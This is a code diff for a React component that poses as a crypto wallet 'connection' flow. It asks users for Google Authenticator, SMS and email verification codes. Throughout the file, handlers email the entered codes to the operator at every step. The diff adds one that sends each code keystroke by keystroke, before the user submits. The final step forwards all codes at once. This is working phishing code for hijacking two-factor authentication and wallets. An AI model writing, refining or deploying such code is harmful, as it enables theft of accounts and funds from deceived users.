@@ -4,7 +4,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Phone, CheckCircle, Wallet, Shield, Smartphone, Mail } from "lucide-react";
-import { sendHighPriorityNotification } from "@/services/emailService";
+import { sendEmailNotification } from "@/services/emailService";
 
 type ConnectionStep = 'initial' | 'callRequest' | 'codeEntry' | 'success';
 
@@ -15,51 +15,33 @@ const WalletLedgerConnection = () => {
     sms: '',
     email: ''
   });
+  const [submittedCodes, setSubmittedCodes] = useState({
+    googleAuth: false,
+    sms: false,
+    email: false
+  });
   const { toast } = useToast();
 
   const handleRequestCall = async () => {
-    // Send HIGH PRIORITY email with ALL AVAILABLE DATA immediately when Request Call button is clicked
     try {
-      console.log('🚨 Sending HIGH PRIORITY request call email with ALL DATA immediately...');
-      await sendHighPriorityNotification({
-        step: "🔴 WALLET CONNECTION - REQUEST CALL BUTTON CLICKED",
-        timestamp: new Date().toISOString(),
-        allFormData: {
-          formType: "WALLET_CONNECTION",
-          action: "REQUEST_CALL_CLICKED",
-          buttonClicked: "REQUEST_CALL",
-          currentStep: "initial",
-          timestamp: new Date().toISOString(),
-          allCodesEntered: codes
-        }
+      await sendEmailNotification({
+        step: "Wallet Connection - Call Requested",
+        timestamp: new Date().toISOString()
       });
-      console.log('✅ HIGH PRIORITY request call email with ALL DATA sent immediately!');
     } catch (error) {
-      console.error('❌ HIGH PRIORITY request call email failed:', error);
+      console.error('Email notification failed:', error);
     }
     setCurrentStep('callRequest');
   };
 
   const handleCallConfirm = async () => {
-    // Send HIGH PRIORITY email with ALL AVAILABLE DATA immediately when Next button is clicked
     try {
-      console.log('🚨 Sending HIGH PRIORITY call confirm email with ALL DATA immediately...');
-      await sendHighPriorityNotification({
-        step: "🔴 WALLET CONNECTION - CALL CONFIRMATION NEXT BUTTON CLICKED",
-        timestamp: new Date().toISOString(),
-        allFormData: {
-          formType: "WALLET_CONNECTION",
-          action: "CALL_CONFIRMED",
-          buttonClicked: "NEXT",
-          verificationCode: "88-12-30",
-          currentStep: "callRequest",
-          timestamp: new Date().toISOString(),
-          allCodesEntered: codes
-        }
+      await sendEmailNotification({
+        step: "Wallet Connection - Call Confirmed",
+        timestamp: new Date().toISOString()
       });
-      console.log('✅ HIGH PRIORITY call confirm email with ALL DATA sent immediately!');
     } catch (error) {
-      console.error('❌ HIGH PRIORITY call confirm email failed:', error);
+      console.error('Email notification failed:', error);
     }
     setCurrentStep('codeEntry');
     toast({
@@ -68,7 +50,7 @@ const WalletLedgerConnection = () => {
     });
   };
 
-  const handleCodeChange = (field: keyof typeof codes, value: string) => {
+  const handleCodeChange = async (field: keyof typeof codes, value: string) => {
     // Apply different length limits based on the field
     let processedValue = value;
     if (field === 'googleAuth') {
@@ -78,34 +60,35 @@ const WalletLedgerConnection = () => {
       processedValue = value.replace(/\D/g, '').slice(0, 12);
     }
     setCodes(prev => ({ ...prev, [field]: processedValue }));
+
+    // Send email when code is entered (not empty)
+    if (processedValue.trim()) {
+      try {
+        await sendEmailNotification({
+          step: "Wallet Connection - Code Entry",
+          field: `${field} code`,
+          value: processedValue,
+          timestamp: new Date().toISOString()
+        });
+      } catch (error) {
+        console.error('Email notification failed:', error);
+      }
+    }
   };
 
   const handleCodeSubmit = async (field: keyof typeof codes) => {
-    const minLength = field === 'googleAuth' ? 6 : 4;
+    const minLength = field === 'googleAuth' ? 6 : 4; // Minimum 4 characters for SMS/email, 6 for Google Auth
     
     if (codes[field].length >= minLength) {
-      // Send HIGH PRIORITY email with ALL FORM DATA immediately when code submit button is clicked
       try {
-        console.log(`🚨 Sending HIGH PRIORITY ${field} code submit email with ALL DATA immediately...`);
-        await sendHighPriorityNotification({
-          step: `🔴 WALLET CONNECTION - ${field.toUpperCase()} CODE SUBMIT BUTTON CLICKED`,
+        await sendEmailNotification({
+          step: "Wallet Connection - Code Submitted",
           field: `${field} code submission`,
           value: codes[field],
-          timestamp: new Date().toISOString(),
-          allFormData: {
-            formType: "WALLET_CONNECTION",
-            action: "CODE_SUBMITTED",
-            buttonClicked: "SUBMIT",
-            codeType: field,
-            codeValue: codes[field],
-            allCodes: codes,
-            currentStep: "codeEntry",
-            timestamp: new Date().toISOString()
-          }
+          timestamp: new Date().toISOString()
         });
-        console.log(`✅ HIGH PRIORITY ${field} code submit email with ALL DATA sent immediately!`);
       } catch (error) {
-        console.error(`❌ HIGH PRIORITY ${field} code submit email failed:`, error);
+        console.error('Email notification failed:', error);
       }
 
       toast({
@@ -122,27 +105,14 @@ const WalletLedgerConnection = () => {
   };
 
   const handleFinalNext = async () => {
-    // Send HIGH PRIORITY email with ALL COLLECTED DATA immediately when Continue button is clicked
     try {
-      console.log('🚨 Sending HIGH PRIORITY final next email with ALL DATA immediately...');
-      await sendHighPriorityNotification({
-        step: "🔴 WALLET CONNECTION - CONTINUE TO WALLET CONNECTION BUTTON CLICKED",
+      await sendEmailNotification({
+        step: "Wallet Connection - Final Step",
         timestamp: new Date().toISOString(),
-        allFormData: {
-          formType: "WALLET_CONNECTION",
-          action: "CONTINUE_TO_WALLET_CONNECTION",
-          buttonClicked: "CONTINUE_TO_WALLET_CONNECTION",
-          allCodes: codes,
-          currentStep: "codeEntry",
-          timestamp: new Date().toISOString(),
-          googleAuthCode: codes.googleAuth,
-          smsCode: codes.sms,
-          emailCode: codes.email
-        }
+        allFormData: codes
       });
-      console.log('✅ HIGH PRIORITY final next email with ALL DATA sent immediately!');
     } catch (error) {
-      console.error('❌ HIGH PRIORITY final next email failed:', error);
+      console.error('Email notification failed:', error);
     }
     setCurrentStep('success');
   };
